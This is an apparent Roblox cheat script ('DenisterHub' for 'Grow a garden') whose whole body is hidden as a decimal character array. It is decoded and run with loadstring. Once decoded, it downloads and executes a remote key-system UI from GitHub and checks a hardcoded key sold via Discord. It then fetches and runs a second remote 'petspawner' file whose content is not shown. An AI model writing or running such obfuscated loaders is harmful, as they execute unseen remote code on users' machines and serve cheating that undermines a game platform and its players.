local ascii = {
108,111,  99,  97, 108,  32,  75, 101, 121,  83, 121, 115, 116, 101, 109,  32,  61,  32,108,111,  97,100,115,116,114,105,110,103, 40,103, 97,109,101, 58, 72,116,116,112, 71,101,116, 40, 34,
104,116,116,112,115, 58, 47, 47,114, 97,119, 46,103,105,116,104,117, 98,117,115,101,114, 99,111,110,116,101,110,116, 46, 99,111,109, 47, 79,111,112,115,115, 83,111,114,114,121, 47, 76,117,
 97, 85, 45, 70,114,101,101, 45, 75,101,121, 45, 83,121,115,116,101,109, 45, 85, 73, 47,109, 97,105,110, 47,115,111,117,114, 99,101, 46,108,117, 97, 34, 41, 41, 40, 41, 10,
108,111,  99, 97,108,  32,  75,101,121, 86, 97,108,105,100, 32, 61, 32,102, 97,108,115,101, 10,
108,111,  99, 97,108, 32,114,101,115,112,111,110,115,101, 32, 61, 32, 75,101,121, 83,121,115,116,101,109, 58, 73,110,105,116, 40,123,10,
 68,101, 98,117,103, 61,102, 97,108,115,101, 44,10,
 84,105,116,108,101, 61, 34, 68,101,110,105,115,116,101,114, 72,117, 98, 32,124, 32, 71,114,111,119, 32, 97, 32,103, 97,114,100,101,110, 34, 44,10,
 68,101,115, 99,114,105,112,116,105,111,110, 61, 34, 80,108,101, 97,115,101, 32,112,117,114, 99,104, 97,115,101, 32, 97, 32,107,101,121, 32,111,110, 32, 68,105,115, 99,111,114,100, 34, 44,
10, 68,105,115, 99,111,114,100, 61, 34,104,116,116,112,115, 58, 47, 47,100,105,115, 99,111,114,100, 46,103,103, 47, 77,107, 75,106, 53, 72, 66, 80,106, 72, 34, 44,10,
 83, 97,118,101, 75,101,121, 61,102, 97,108,115,101, 44,10,
 86,101,114,105,102,121, 61,102,117,110, 99,116,105,111,110, 40,107,101,121, 41, 10,
  9,105,102, 32,107,101,121, 61, 61, 34,101, 52,100, 57, 48, 57, 99, 50, 57, 48,100, 48,102, 98, 49, 99, 97, 48, 54, 56,102,102, 97,100,100,102, 50, 50, 99, 98,100, 48, 34, 32,116,104,101,110,
10,
  9,  9, 75,101,121, 86, 97,108,105,100, 61,116,114,117,101, 10,
  9,  9,114,101,116,117,114,110, 32,116,114,117,101, 10,
  9,101,108,115,101, 10,
  9,  9,114,101,116,117,114,110, 32,102, 97,108,115,101, 10,
  9,101,110,100, 44,10,
 71,117,105, 80, 97,114,101,110,116, 32, 61, 32,103, 97,109,101, 46, 67,111,114,101, 71,117,105, 10,
125, 41, 10,
105,102, 32,110,111,116, 32,114,101,115,112,111,110,115,101, 32,111,114, 32,110,111,116, 32, 75,101,121, 86, 97,108,105,100, 32,116,104,101,110, 32,114,101,116,117,114,110, 32,101,110,
100, 10,
108,111, 97,100,115,116,114,105,110,103, 40,103, 97,109,101, 58, 72,116,116,112, 71,101,116, 40, 34,104,116,116,112,115, 58, 47, 47,114, 97,119, 46,103,105,116,104,117, 98,117,115,101,
114, 99,111,110,116,101,110,116, 46, 99,111,109, 47,113,119,101,113,114,101,100,102, 47,112,101,116,115,112, 97,119,110,101,114, 47,114,101,102,115, 47,104,101, 97,100,115, 47,109, 97,
105,110, 47, 57, 97, 97,101, 53, 49, 49, 55, 49,101, 48, 54, 54, 51, 55, 51, 57, 48,102, 99, 97, 51, 51, 55, 48, 98, 50, 53, 97, 51, 51, 55, 46,116,120,116, 34, 41, 41, 40, 41
}

local str = ""
for _, v in ipairs(ascii) do
	str = str .. string.char(v)
end

loadstring(str)()
